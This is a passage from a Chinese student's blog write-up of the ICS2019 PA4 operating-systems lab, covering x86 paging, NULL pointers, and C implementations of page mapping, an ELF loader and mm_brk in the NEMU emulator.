href="https://vgalaxy.work/2022/01/01/icspa4/#%E7%94%A8%E6%88%B7%E8%BF%9B%E7%A8%8B%E7%9A%84%E5%8F%82%E6%95%B0">博客</a>的问题和我类似:</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA4/20230828205708311090_229_20230601235508361359_580_image-20230531210624959.png" alt="image-20230531210624959"><figcaption aria-hidden="true">image-20230531210624959</figcaption></figure><p>但是我尝试了传完整路径，还是不行(哭)</p><p>把PA其他部分做完回过头来尝试解决这个问题未果。不过既然<code>argc</code>能正常传递，想跳过商标页面还是能实现的。我们就用<code>argc</code>判断。</p><p><code>pal-main.c</code></p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-rdb5uulmrh9u68"></i><span>C++</span><div class="collapse show" id="collapse-rdb5uulmrh9u68"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> *argv[])</span></span><span class="hljs-function"></span>{<span class="hljs-built_in">Log</span>(<span class="hljs-string">"game start!"</span>);<span class="hljs-built_in">Log</span>(<span class="hljs-string">"here show the args:"</span>);<span class="hljs-built_in">Log</span>(<span class="hljs-string">"argc: %d"</span>, argc);<span class="hljs-comment">//log the address of argv</span><span class="hljs-built_in">Log</span>(<span class="hljs-string">"argv: %x"</span>, argv);<span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; argc; i++){<span class="hljs-type">char</span>* arg = argv[i];<span class="hljs-built_in">Log</span>(<span class="hljs-string">"argv[%d]: %s"</span>, i, arg);}<span class="hljs-built_in">hal_init</span>();<span class="hljs-built_in">main_loop</span>(argc);<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;}</code></pre></div></div><p><code>main.c</code></p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-xn0c5ylmrh9u68"></i><span>C++</span><div class="collapse show" id="collapse-xn0c5ylmrh9u68"><pre><code class="hljs C++"><span class="hljs-keyword">if</span> (argc!=<span class="hljs-number">2</span>){   <span class="hljs-built_in">PAL_TrademarkScreen</span>();   <span class="hljs-built_in">PAL_SplashScreen</span>();}</code></pre></div></div><p>可以看到直接跳过了加载动画。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA4/20230828205709364413_382_20230601235512642869_760_image-20230531212149363.png" alt="image-20230531212149363"><figcaption aria-hidden="true">image-20230531212149363</figcaption></figure><h2 id="阶段二">阶段二</h2><h3 id="理解分页机制">理解分页机制</h3><h4 id="理解分页细节">理解分页细节</h4><ul><li>内存分页一页大小时 <span class="math inline">\(4\mathrm{~KB}\)</span> ，那么 <span class="math inline">\(4\mathrm{~GB}\)</span> 内存被分成 <span class="math inline">\(\frac{4\mathrm{~GB}}{4 \mathrm{~KB}}=2^{20}\)</span> 页，因此只需要 20 位寻址<span class="math inline">\(2^{20}\)</span> 页即可</li><li>因为虚拟地址到物理地址需要翻译，在访问CR3是并不知道映射规则（保存在页目录中，毕竟访问CR3就是为了得到页目录) 那就肯定只能按照物理地址访问</li><li>页目录中会存储页表项 (用来寻址 <span class="math inline">\(2^{20}\)</span> 页理论上只需要 <span class="math inline">\(3 \text B\)</span> 但是为了方便一般页表项大小为<span class="math inline">\(4 \mathrm{~B}\)</span>)，那么每个进程都全部存储空间 (每一个页面)都需要的页标项记录。于是需要空间存$4B × 2^{20} = 4$存储，太大了，如果分级可以利用局部性原理有效减小页表项空间。</li></ul><p>这三个问题其实在操作系统课上宫老师都讲过，<span class="math inline">\(4KB\)</span>的页面大小设计也有巧合在里面。</p><h4 id="空指针真的是空的吗">空指针真的是空的吗</h4><p>NULL是一个标准规定的宏定义，用来表示空指针常量。在C中和早期的C++中它就是0</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-5fs2salmrh9u68"></i><span>C++</span><div class="collapse show" id="collapse-5fs2salmrh9u68"><pre><code class="hljs C++"><span class="hljs-meta">#<span class="hljs-keyword">define</span> NULL (void*)0</span></code></pre></div></div><p>后来C++有了<code>nullptr</code>这个东西，不过与这个问题没啥关系。</p><p>下面的部分引自<a href="https://www.cnblogs.com/fly1988happy/archive/2012/04/16/2452021.html#">博客园</a></p><blockquote><p>程序在使用的是系统给定的一个段，程序中的<strong>零值指针指向这个段的开端</strong>，为了保证NULL概念，系统为我们<strong>这个段的开头64K内存做了苛刻的规定</strong>，根据虚拟内存访问权限控制，我们程序中（低访问权限）访问要求<strong>高访问权限的这64K内存</strong>被视作是不容许的，所以会必然引发<strong>AccessVolitation</strong>错误，而这高权限的64K内存是一块<strong>保留内存</strong>（即<strong>不能被程序动态内存分配器分配，不能被访问，也不能被使用</strong>），就是简单的保留，不作任何使用。</p></blockquote><p>因此空指针不是真的"空"。但NULL确实是0地址，它在虚拟地址空间中没有映射/有较高的访问权限。所以访问空指针的内容会爆段错误。</p><h3 id="实现分页机制">实现分页机制</h3><p>先看一下加上<code>HAS_VME</code>是什么情况:</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA4/20230828205710798062_415_20230601235517932149_981_image-20230529222248388.png" alt="image-20230529222248388"><figcaption aria-hidden="true">image-20230529222248388</figcaption></figure><p>是这条指令:</p><p><code>1010b0:  0f 22 d8                mov    %eax,%cr3</code></p><p>显然<code>cr3</code>的出现应当意识到与分页有关。而且是<code>invalid opcode</code>，那么就先要吧这个指令补上。这是一个两比特操作码的指令，在表的下面一部分</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-6bbj25lmrh9u68"></i><span>C++</span><div class="collapse show" id="collapse-6bbj25lmrh9u68"><pre><code class="hljs C++"><span class="hljs-comment">/* 0x20 */</span><span class="hljs-built_in">IDEXW</span>(G2E,mov_cr2r,<span class="hljs-number">4</span>), EMPTY, <span class="hljs-built_in">IDEXW</span>(E2G,mov_r2cr,<span class="hljs-number">4</span>), EMPTY,</code></pre></div></div><p>查阅手册<code>0x21</code>也是与<code>cr</code>寄存器有关，一起补上。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA4/20230828205712227982_962_20230601235521194013_589_image-20230529223520788.png" alt="image-20230529223520788"><figcaption aria-hidden="true">image-20230529223520788</figcaption></figure><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-gczctwlmrh9u68"></i><span>C++</span><div class="collapse show" id="collapse-gczctwlmrh9u68"><pre><code class="hljs C++"><span class="hljs-built_in">make_EHelper</span>(mov_r2cr) {  <span class="hljs-comment">//TODO();</span>  <span class="hljs-keyword">if</span> (id_dest-&gt;reg==<span class="hljs-number">0</span>) cpu.cr0.val=id_src-&gt;val;  <span class="hljs-keyword">else</span> cpu.cr3.val=id_src-&gt;val;  <span class="hljs-built_in">print_asm</span>(<span class="hljs-string">"movl %%%s,%%cr%d"</span>, <span class="hljs-built_in">reg_name</span>(id_src-&gt;reg, <span class="hljs-number">4</span>), id_dest-&gt;reg);}<span class="hljs-built_in">make_EHelper</span>(mov_cr2r) {  <span class="hljs-comment">//TODO();</span>  <span class="hljs-keyword">if</span> (id_src-&gt;reg==<span class="hljs-number">0</span>) cpu.gpr[id_dest-&gt;reg]._32=cpu.cr0.val;  <span class="hljs-keyword">else</span> cpu.gpr[id_dest-&gt;reg]._32=cpu.cr3.val;  <span class="hljs-built_in">print_asm</span>(<span class="hljs-string">"movl %%cr%d,%%%s"</span>, id_src-&gt;reg, <span class="hljs-built_in">reg_name</span>(id_dest-&gt;reg, <span class="hljs-number">4</span>));  <span class="hljs-built_in">difftest_skip_ref</span>();}</code></pre></div></div><p>指令实现很简单，反正我们需要考虑的要么是<code>cr0</code>要么是<code>cr3</code>。</p><p><code>CPU_state</code>也要补上这两个寄存器。寄存器的结构需<code>#include "mmu.h"</code>，在<code>nemu/src/isa/x86/include/isa/mmu.h</code>里定义。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA4/20230828205713198935_761_20230601235523234821_360_image-20230529224445299.png" alt="image-20230529224445299"><figcaption aria-hidden="true">image-20230529224445299</figcaption></figure><p>看上去好像能跑了？但还不是在虚拟地址上跑的嘛。因为目前<code>isa_vaddr_read()</code>,<code>isa_vaddr_write()</code>并没有进行改动。这个就合并到下一节完成。</p><h3 id="在分页机制上运行用户进程">在分页机制上运行用户进程</h3><blockquote><p>我们先单独运行dummy(别忘记修改调度代码),并先在<code>exit</code>的实现中调用<code>_halt()</code>结束系统的运行。</p></blockquote><p>先修改调度代码，省的后面忘了:</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-jl5aarlmrh9u68"></i><span>C++</span><div class="collapse show" id="collapse-jl5aarlmrh9u68"><pre><code class="hljs C++"><span class="hljs-function">_Context *<span class="hljs-title">schedule</span><span class="hljs-params">(_Context *prev)</span></span><span class="hljs-function"></span>{  <span class="hljs-comment">// save the context pointer</span>  current-&gt;cp = prev;  <span class="hljs-comment">// current = ((current == &amp;pcb[0]) ? &amp;pcb[1] : &amp;pcb[0]);</span>  current = &amp;pcb[<span class="hljs-number">0</span>];  <span class="hljs-comment">// then return the new context</span>  <span class="hljs-keyword">return</span> current-&gt;cp;}</code></pre></div></div><p><code>_Context *do_syscall(_Context *c)</code></p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-kkjccllmrh9u68"></i><span>C++</span><div class="collapse show" id="collapse-kkjccllmrh9u68"><pre><code class="hljs C++"><span class="hljs-keyword">case</span> SYS_exit:  _halt(a[<span class="hljs-number">1</span>]);</code></pre></div></div><p>需要按讲义中所讲取消原来进入开机菜单的选项，直接运行dummy。现在还没实现分页，可以看到也是能正常运行的。因为它只是调用了一下系统调用。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA4/20230828205716575380_419_20230601235527208599_859_image-20230530150819865.png" alt="image-20230530150819865"><figcaption aria-hidden="true">image-20230530150819865</figcaption></figure><p>然后打开<code>makefile.compile</code>里的<code>VME=enable</code>之后，就发现寄喽。</p><blockquote><p>我们首先需要在加载用户进程之前为其创建地址空间.由于地址空间是进程相关的,我们将<code>_AddressSpace</code>结构体作为PCB的一部分. 这样以后,我们只需要在<code>context_uload()</code>的开头调用<code>_protect()</code>,就可以实现地址空间的创建。</p></blockquote><p>目前这个地址空间除了内核映射之外就没有其它内容了。看代码确实如此。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-ysmtzwlmrh9u68"></i><span>C++</span><div class="collapse show" id="collapse-ysmtzwlmrh9u68"><pre><code class="hljs C++"><span class="hljs-type">int</span> _protect(_AddressSpace *as) {  PDE *updir = (PDE*)(<span class="hljs-built_in">pgalloc_usr</span>(<span class="hljs-number">1</span>));  as-&gt;ptr = updir;  <span class="hljs-comment">// map kernel space</span>  <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; NR_PDE; i ++) {    updir[i] = kpdirs[i];  }  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;}</code></pre></div></div><blockquote><p><code>loader()</code>要做的事情是, 获取程序的大小之后,以页为单位进行加载:</p><ul><li>申请一页空闲的物理页</li><li>通过<code>_map()</code>把这一物理页映射到用户进程的虚拟地址空间中</li><li>从文件中读入一页的内容到这一物理页上</li></ul></blockquote><p>这一部分实现需要谨慎一些，注意细节,写起来也让人挺抓狂的。不过还好没在这里卡住，反而下面犯了一个很蠢的错误。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-1dfec2lmrh9u68"></i><span>C++</span><div class="collapse show" id="collapse-1dfec2lmrh9u68"><pre><code class="hljs C++">Elf_Ehdr elf_header;<span class="hljs-type">int</span> fd = <span class="hljs-built_in">fs_open</span>(filename, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<span class="hljs-built_in">Log</span>(<span class="hljs-string">"filename: %s, fd: %d"</span>, filename, fd);<span class="hljs-type">size_t</span> read_len = <span class="hljs-built_in">fs_read</span>(fd, &amp;elf_header, <span class="hljs-built_in">sizeof</span>(Elf_Ehdr));<span class="hljs-built_in">assert</span>(read_len == <span class="hljs-built_in">sizeof</span>(Elf_Ehdr));Elf_Phdr elf_program_header[elf_header.e_phnum];<span class="hljs-built_in">fs_lseek</span>(fd, elf_header.e_phoff, SEEK_SET);read_len = <span class="hljs-built_in">fs_read</span>(fd, elf_program_header, <span class="hljs-built_in">sizeof</span>(Elf_Phdr) * elf_header.e_phnum);<span class="hljs-built_in">assert</span>(read_len == <span class="hljs-built_in">sizeof</span>(Elf_Phdr) * elf_header.e_phnum);<span class="hljs-type">uintptr_t</span> vaddr = <span class="hljs-number">0</span>;<span class="hljs-type">size_t</span> page_num;<span class="hljs-type">void</span> *pa;<span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; elf_header.e_phnum; i++){    <span class="hljs-comment">// only load PT_LOAD type</span>    <span class="hljs-keyword">if</span> (elf_program_header[i].p_type != PT_LOAD)    {        <span class="hljs-keyword">continue</span>;    }    <span class="hljs-built_in">fs_lseek</span>(fd, elf_program_header[i].p_offset, SEEK_SET);    vaddr = elf_program_header[i].p_vaddr;    page_num = (elf_program_header[i].p_filesz - <span class="hljs-number">1</span>) / PGSIZE + <span class="hljs-number">1</span>;    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; page_num; j++)    {        pa = <span class="hljs-built_in">new_page</span>(<span class="hljs-number">1</span>);        <span class="hljs-comment">// check if the page is 4kb aligned</span>        <span class="hljs-built_in">assert</span>((vaddr &amp; <span class="hljs-number">0xfff</span>) == <span class="hljs-number">0</span>);        _map(&amp;pcb-&gt;as, (<span class="hljs-type">void</span> *)vaddr, pa, <span class="hljs-number">1</span>);        <span class="hljs-keyword">if</span> (j &lt; page_num - <span class="hljs-number">1</span>)        {            <span class="hljs-built_in">fs_read</span>(fd, pa, PGSIZE);        }        <span class="hljs-keyword">else</span>        {            <span class="hljs-built_in">fs_read</span>(fd, pa, elf_program_header[i].p_filesz % PGSIZE);        }        vaddr += PGSIZE;    }    <span class="hljs-built_in">assert</span>(vaddr = page_num * PGSIZE + elf_program_header[i].p_vaddr);    <span class="hljs-comment">// set the rest [Virtual Address + File Size, Virtual Address + Memory Size) to 0 turns to be a little complex</span>    <span class="hljs-keyword">if</span> (elf_program_header[i].p_filesz == elf_program_header[i].p_memsz)    {        pcb-&gt;max_brk = vaddr;        <span class="hljs-keyword">continue</span>;    }    <span class="hljs-type">int</span> zero_len = elf_program_header[i].p_memsz - elf_program_header[i].p_filesz;    <span class="hljs-keyword">if</span> (zero_len &lt; page_num * PGSIZE - elf_program_header[i].p_filesz)    {        <span class="hljs-built_in">memset</span>((<span class="hljs-type">void</span> *)(((<span class="hljs-type">uintptr_t</span>)pa) + (elf_program_header[i].p_filesz - PGSIZE * (page_num - <span class="hljs-number">1</span>))), <span class="hljs-number">0</span>, zero_len);    }    <span class="hljs-keyword">else</span>    {        <span class="hljs-comment">// set the current page to 0</span>        <span class="hljs-built_in">memset</span>((<span class="hljs-type">void</span> *)(((<span class="hljs-type">uintptr_t</span>)pa) + (elf_program_header[i].p_filesz - PGSIZE * (page_num - <span class="hljs-number">1</span>))), <span class="hljs-number">0</span>, PGSIZE - elf_program_header[i].p_filesz % PGSIZE);        zero_len -= (PGSIZE - elf_program_header[i].p_filesz % PGSIZE);        <span class="hljs-comment">// set the rest pages to 0 (we need to allocate new pages)</span>        page_num = (zero_len - <span class="hljs-number">1</span>) / PGSIZE + <span class="hljs-number">1</span>;        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; page_num; j++)        {            pa = <span class="hljs-built_in">new_page</span>(<span class="hljs-number">1</span>);            <span class="hljs-built_in">assert</span>((vaddr &amp; <span class="hljs-number">0xfff</span>) == <span class="hljs-number">0</span>);            _map(&amp;pcb-&gt;as, (<span class="hljs-type">void</span> *)vaddr, pa, <span class="hljs-number">1</span>);            <span class="hljs-keyword">if</span> (j &lt; page_num - <span class="hljs-number">1</span>)            {                <span class="hljs-built_in">memset</span>(pa, <span class="hljs-number">0</span>, PGSIZE);            }            <span class="hljs-keyword">else</span>            {                <span class="hljs-built_in">memset</span>(pa, <span class="hljs-number">0</span>, zero_len % PGSIZE);            }            vaddr += PGSIZE;        }    }    pcb-&gt;max_brk = vaddr;}<span class="hljs-built_in">fs_close</span>(fd);<span class="hljs-keyword">return</span> elf_header.e_entry;</code></pre></div></div><blockquote><p>你需要在AM中实现<code>_map()</code>函数(在<code>nexus-am/am/src/$ISA/nemu/src/vme.c</code>中定义),你可以通过<code>as-&gt;ptr</code>获取页目录的基地址.若在映射过程中发现需要申请新的页表,可以通过回调函数<code>pgalloc_usr()</code>向Nanos-lite获取一页空闲的物理页.</p></blockquote><p><code>x86.h</code>中有一些宏可以帮我们完成页面相关的地址转换，不用自己造轮子。</p><p>判断页面存在需要看最后一位是不是1，手册里说的很清楚。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA4/20230828205717905352_201_20230601235531573391_617_image-20230530193239098.png" alt="image-20230530193239098"><figcaption aria-hidden="true">image-20230530193239098</figcaption></figure><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-1sz3kclmrh9u68"></i><span>C++</span><div class="collapse show" id="collapse-1sz3kclmrh9u68"><pre><code class="hljs C++"><span class="hljs-type">int</span> _map(_AddressSpace *as, <span class="hljs-type">void</span> *va, <span class="hljs-type">void</span> *pa, <span class="hljs-type">int</span> prot){  <span class="hljs-comment">// 来自讲义:将地址空间as中虚拟地址va所在的虚拟页, 以prot的权限映射到pa所在的物理页. 当prot中的present位为0时, 表示让va的映射无效</span>  PDE *pdir = (PDE *)as-&gt;ptr;  PTE *ptab;  <span class="hljs-type">uint32_t</span> pdir_idx = <span class="hljs-built_in">PDX</span>(va);  <span class="hljs-type">uint32_t</span> ptab_idx = <span class="hljs-built_in">PTX</span>(va);  <span class="hljs-keyword">if</span> (pdir[pdir_idx] &amp;PTE_P)  {    <span class="hljs-comment">// the page table is already exist</span>    ptab = (PTE *)(<span class="hljs-built_in">PTE_ADDR</span>(pdir[pdir_idx]));  }  <span class="hljs-keyword">else</span>  {    <span class="hljs-comment">// the page table is not exist</span>    ptab = (PTE *)(<span class="hljs-built_in">PTE_ADDR</span>(<span class="hljs-built_in">pgalloc_usr</span>(<span class="hljs-number">1</span>)));    <span class="hljs-comment">// map the new-allocted page table to the pdir</span>    pdir[pdir_idx] = (<span class="hljs-type">uintptr_t</span>)ptab | PTE_P;  }  <span class="hljs-comment">// map the page</span>  ptab[ptab_idx] = <span class="hljs-built_in">PTE_ADDR</span>(pa) |PTE_P;  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;}</code></pre></div></div><blockquote><p>为了让这一地址空间生效, 我们还需要将它落实到MMU中. 具体地,我们希望在CTE恢复进程上下文的时候来切换地址空间. 为此,我们需要将进程的地址空间描述符指针加入到上下文中.框架代码已经实现了这一功能(见<code>nexus-am/am/include/arch/$ISA-nemu.h</code>),</p></blockquote><p>确实。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-b4xjpmlmrh9u68"></i><span>C++</span><div class="collapse show" id="collapse-b4xjpmlmrh9u68"><pre><code class="hljs C++"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">_Context</span> {  <span class="hljs-keyword">struct</span> <span class="hljs-title class_">_AddressSpace</span> *as;  <span class="hljs-type">uintptr_t</span> edi,esi, ebp, esp, ebx,edx,ecx,eax;  <span class="hljs-type">int</span> irq;  <span class="hljs-type">uintptr_t</span> eip, cs,eflags;};</code></pre></div></div><blockquote><p>但你还需要</p><ul><li>修改<code>_ucontext()</code>的实现,在创建的用户进程上下文中设置地址空间相关的指针<code>as</code></li><li>在<code>__am_irq_handle()</code>的开头调用<code>__am_get_cur_as()</code>(在<code>nexus-am/am/src/$ISA/nemu/vme.c</code>中定义),来将当前的地址空间描述符指针保存到上下文中</li><li>在<code>__am_irq_handle()</code>返回前调用<code>__am_switch()</code>(<code>nexus-am/am/src/$ISA/nemu/vme.c</code>中定义)来切换地址空间, 将调度目标进程的地址空间落实到MMU中</li></ul></blockquote><p>第一步，前面已经加过了。剩下的两步，照着做就好。</p><p>问题驱动。现在把<code>isa_vaddr_read()</code>和<code>isa_vaddr_write()</code>按照分页地址转换进行修改。写完<code>loader</code>和<code>_map</code>后已经算是对分页机制有较清晰的理解了，即便没有任何提示也基本完成的比较顺畅。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-ur1hihlmrh9u68"></i><span>C++</span><div class="collapse show" id="collapse-ur1hihlmrh9u68"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-type">uint32_t</span> <span class="hljs-title">page_translate</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> addr)</span></span><span class="hljs-function"></span>{  <span class="hljs-comment">// printf("addr:%x\n",addr);</span>  <span class="hljs-type">uint32_t</span> pdir = <span class="hljs-built_in">PDX</span>(addr);  <span class="hljs-type">uint32_t</span> ptab = <span class="hljs-built_in">PTX</span>(addr);  <span class="hljs-type">uint32_t</span> offset = <span class="hljs-built_in">OFF</span>(addr);  <span class="hljs-comment">// note that PDE is a struct, rather than a uint32_t in the nexus-am</span>  PDE pde;  pde.val = <span class="hljs-built_in">paddr_read</span>(<span class="hljs-built_in">PTE_ADDR</span>(cpu.cr3.val) | (pdir &lt;&lt; <span class="hljs-number">2</span>), <span class="hljs-number">4</span>);  <span class="hljs-comment">// guarantee that the page table is present</span>  <span class="hljs-built_in">assert</span>(pde.present == <span class="hljs-number">1</span>);  PTE pte;  pte.val = <span class="hljs-built_in">paddr_read</span>(<span class="hljs-built_in">PTE_ADDR</span>(pde.val) | (ptab &lt;&lt; <span class="hljs-number">2</span>), <span class="hljs-number">4</span>);  <span class="hljs-comment">// guarantee that the page is present</span>  <span class="hljs-keyword">if</span> (pte.present == <span class="hljs-number">0</span>)  {    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"addr:%x\n"</span>, addr);  }  <span class="hljs-built_in">assert</span>(pte.present == <span class="hljs-number">1</span>);  <span class="hljs-type">uint32_t</span> paddr = (<span class="hljs-built_in">PTE_ADDR</span>(pte.val) | offset);  <span class="hljs-comment">// printf("paddr:%x\n",paddr);</span>  <span class="hljs-keyword">return</span> paddr;}<span class="hljs-function"><span class="hljs-type">uint32_t</span> <span class="hljs-title">isa_vaddr_read</span><span class="hljs-params">(<span class="hljs-type">vaddr_t</span> addr, <span class="hljs-type">int</span> len)</span></span><span class="hljs-function"></span>{  <span class="hljs-comment">// return paddr_read(addr, len);</span>  <span class="hljs-comment">// now we need to handle the page mapping</span>  <span class="hljs-keyword">if</span> (cpu.cr0.paging == <span class="hljs-number">0</span>)  {    <span class="hljs-comment">// no paging</span>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">paddr_read</span>(addr, len);  }  <span class="hljs-type">int</span> start_page_num = addr / PAGE_SIZE;  <span class="hljs-type">int</span> end_page_num = (addr + len - <span class="hljs-number">1</span>) / PAGE_SIZE;  <span class="hljs-keyword">if</span> (start_page_num == end_page_num)  {    <span class="hljs-comment">// the data is in one page</span>    <span class="hljs-type">paddr_t</span> paddr = <span class="hljs-built_in">page_translate</span>(addr);    <span class="hljs-keyword">return</span> <span class="hljs-built_in">paddr_read</span>(paddr, len);  }  <span class="hljs-keyword">else</span>  {    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"the data is in two pages\n"</span>);    <span class="hljs-built_in">assert</span>(<span class="hljs-number">0</span>);  }}<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">isa_vaddr_write</span><span class="hljs-params">(<span class="hljs-type">vaddr_t</span> addr, <span class="hljs-type">uint32_t</span> data, <span class="hljs-type">int</span> len)</span></span><span class="hljs-function"></span>{  <span class="hljs-keyword">if</span> (cpu.cr0.paging == <span class="hljs-number">0</span>)  {    <span class="hljs-comment">// no paging</span>    <span class="hljs-built_in">paddr_write</span>(addr, data, len);    <span class="hljs-keyword">return</span>;  }  <span class="hljs-type">int</span> start_page_num = addr / PAGE_SIZE;  <span class="hljs-type">int</span> end_page_num = (addr + len - <span class="hljs-number">1</span>) / PAGE_SIZE;  <span class="hljs-keyword">if</span> (start_page_num == end_page_num)  {    <span class="hljs-comment">// the data is in one page</span>    <span class="hljs-type">paddr_t</span> paddr = <span class="hljs-built_in">page_translate</span>(addr);    <span class="hljs-built_in">paddr_write</span>(paddr, data, len);  }  <span class="hljs-keyword">else</span>  {    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"the data is in two pages\n"</span>);    <span class="hljs-built_in">assert</span>(<span class="hljs-number">0</span>);  }}</code></pre></div></div><p>改正之后能够在分页机制上Hit good trap。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA4/20230828205718828968_290_20230601235535787076_209_image-20230530215433304.png" alt="image-20230530215433304"><figcaption aria-hidden="true">image-20230530215433304</figcaption></figure><h3 id="在分页机制上运行仙剑奇侠传">在分页机制上运行仙剑奇侠传</h3><blockquote><p>现在用户进程运行在分页机制之上,我们还需要在<code>mm_brk()</code>中把新申请的堆区映射到虚拟地址空间中,这样才能保证运行在分页机制上的用户进程可以正确地访问新申请的堆区.</p></blockquote><p>如文中所述:</p><blockquote><p>我们可以不实现堆区的回收功能, 而是只为当前新programbreak超过<code>max_brk</code>部分的虚拟地址空间分配物理页.</p></blockquote><p>据此实现:</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-jexyoulmrh9u68"></i><span>C++</span><div class="collapse show" id="collapse-jexyoulmrh9u68"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">mm_brk</span><span class="hljs-params">(<span class="hljs-type">uintptr_t</span> brk, <span class="hljs-type">intptr_t</span> increment)</span> </span>{<span class="hljs-keyword">if</span> (brk+increment&gt;current-&gt;max_brk){<span class="hljs-type">int</span> new_pgnum=((brk+increment-current-&gt;max_brk)+<span class="hljs-number">0xfff</span>)/PGSIZE;<span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=new_pgnum<span class="hljs-number">-1</span>;i&gt;=<span class="hljs-number">0</span>;--i){<span class="hljs-type">void</span> *pa=<span class="hljs-built_in">new_page</span>(<span class="hljs-number">1</span>);_map(&amp;(current-&gt;as),(<span class="hljs-type">void</span>*)(current-&gt;max_brk),pa,<span class="hljs-number">1</span>);current-&gt;max_brk+=PGSIZE;}}  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;}</code></pre></div></div><p><code>new_pgnum</code>计算了需要分配的页面个数。看上去很简单粗暴。为什么不用考虑页面对齐问题？因为我实现的<code>loader</code>加载的时候分配的<code>max_brk</code>值是页面对齐的，这里更新的时候<code>current-&gt;max_brk+=PGSIZE;</code>也是页面对齐的，因此就不需要考虑<code>brk+increment</code>与 <code>max_brk</code>在同一页面上的问题。</p><p>我们这是在<code>mm</code>中，要想访问当前进程的<code>max_brk</code>需要从进程控制块中获取。因此需要</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-0l9tk7lmrh9u68"></i><span>C++</span><div class="collapse show" id="collapse-0l9tk7lmrh9u68"><pre><code class="hljs C++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">"proc.h"</span></span><span class="hljs-keyword">extern</span> PCB *current;</code></pre></div></div><p>别忘了在系统调用里注册新实现的<code>max_brk</code>，一开始实现完了忘了注册，缺一堆页，排查了一个多小时发现是忘了在系统调用更新。</p><p><code>_Context *do_syscall(_Context *c)</code>:</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-9m3u2llmrh9u68"></i><span>C++</span><div class="collapse show" id="collapse-9m3u2llmrh9u68"><pre><code class="hljs C++"> <span class="hljs-keyword">case</span> SYS_brk:{<span class="hljs-built_in">Log</span>(<span class="hljs-string">"brk syscall"</span>);<span class="hljs-comment">//_end=*((char*)c-&gt;GPR2);</span><span class="hljs-built_in">mm_brk</span>((<span class="hljs-type">uintptr_t</span>)a[<span class="hljs-number">1</span>],(<span class="hljs-type">intptr_t</span>)a[<span class="hljs-number">2</span>]);c-&gt;GPRx=<span class="hljs-number">0</span>;<span class="hljs-keyword">break</span>;}</code></pre></div></div><p>好了，我们跑一下仙剑奇侠传看看:</p><figure><img 